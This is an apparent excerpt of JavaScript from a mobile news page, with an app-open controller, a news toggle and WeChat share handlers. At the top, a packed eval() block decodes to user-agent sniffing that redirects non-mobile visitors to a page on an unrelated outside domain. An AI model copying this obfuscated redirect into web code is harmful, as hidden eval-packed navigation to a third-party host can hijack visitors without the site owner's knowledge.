...
(function (a, b) {
    ...
    eval(function (p, a, c, k, e, d) {
        ...
        return p;
    }('9 a={2:q(){9 b=8.r,c=8.p;n{o:b.0(\'v\')>-1,w:b.0(\'u\')>-1,s:b.0(\'5\')>-1,t:b.0(\'l\')>-1&&b.0(\'f\')==-1,j:!!b.3(/5.*k.*/)||!!b.3(/5/),6:!!b.3(/\\(i[^;]+;( h;)? g.+e H J/),7:b.0(\'K\')>-1||b.0(\'M\')>-1,d:b.0(\'d\')>-1||b.0(\'e\')>-1,4:b.0(\'4\')>-1,I:b.0(\'L\')==-1}}()};G(!a.2.6&&!a.2.z&&!a.2.7&&!a.2.A&&!a.2.4){x.y=\'B://E.F/m/C.D\'}', 49, 49, 'indexOf||versions|match|iPad|AppleWebKit|ios|android|navigator|var||||iPhone|Mac|KHTML|CPU|U||mobile|Mobile|Gecko||return|trident|appVersion|function|userAgent|webKit|gecko|Presto|Trident|presto|self|location|mobie|iPhon|http|error|html|wedlaa|com|if|OS|webApp|X|Android|Safari|Linux'.split('|'), 0, {}));
...
var openAppController = function (h) {
    return{callDone: false, showDone: false, init: function () {
...
var showMoreNews = {isBeginHide: false, init: function () {
...
var weChatBridgeReady = {init: function () {
    ...
    WeixinJSBridge.on("menu:share:appmessage", function (b) {
        WeixinJSBridge.invoke("sendAppMessage", {appid: "", img_url: contentModel.img_url, img_width: "65", img_height: "65", link: a, desc: contentModel.src, title: contentModel.title}, function (d) {
    ...
    WeixinJSBridge.on("menu:share:timeline", function (b) {
        WeixinJSBridge.invoke("shareTimeline", {img_url: contentModel.img_url, img_width: "65", img_height: "65", link: a, desc: "view.inews.qq.com", title: contentModel.title}, function (d) {
            WeixinJSBridge.log(d.err_msg)
        })
    })
}};
